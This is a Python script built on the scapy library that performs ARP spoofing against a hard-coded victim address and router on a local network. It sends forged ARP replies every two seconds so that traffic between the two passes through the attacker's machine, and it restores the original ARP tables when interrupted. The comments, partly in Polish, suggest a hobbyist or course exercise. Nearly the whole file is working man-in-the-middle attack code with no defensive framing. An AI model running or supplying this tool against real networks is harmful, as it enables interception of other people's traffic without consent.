import time
import sys
import scapy.all as scapy
def get_mac(ip):           #gets the mac of the specified ip (also ip ranges)

    arp_request = scapy.ARP(pdst=ip) #create an objact of an arp packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #creats a ethernet frame
    arp_request_broadcast = broadcast/arp_request #combining these two packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #tells to return ONLY one list !!!

    #return answered_list[0][1].hwdst #first index is a packet send/received second index is taking just the received data
    #answered_list[0][0]    to jest arp request
    #answered_list[0][1]    to jest arp response

    return answered_list[0][1].hwsrc

def restore(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)
    arp_response_packets=[]
    arp_response_packets.append(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac))
    arp_response_packets.append(scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac))
    for packets in arp_response_packets:
        scapy.send(packets, verbose=False)
    print("[-] Initial configuration restored")

def spoof(target_ip, spoof_ip):
    #First create a ARP packets response
    try:
        target_mac = get_mac(target_ip)
    except IndexError:
        print("[-]Target not reachable... quiting")
        sys.exit()
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #very important: this packets pretends to be send from the router
    scapy.send(packet, verbose=False)

    #to the victim but the sender is indeed me
    # So after the victiom receives this packet it will update the actual router's mac with mine mac address
    # Every time victim wants to send sth to the GW it uses mine mac address GREAT
    #print(packet.show())
    #print(packet.summary())

send_packet_count = 0

victim_ip = "192.168.1.70"
router_ip = "192.168.1.1"
try:
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        send_packet_count += 2
        print("\r[+] Send {} packets".format(send_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Ctr+C detected ... Quiting")
    restore(victim_ip, router_ip)
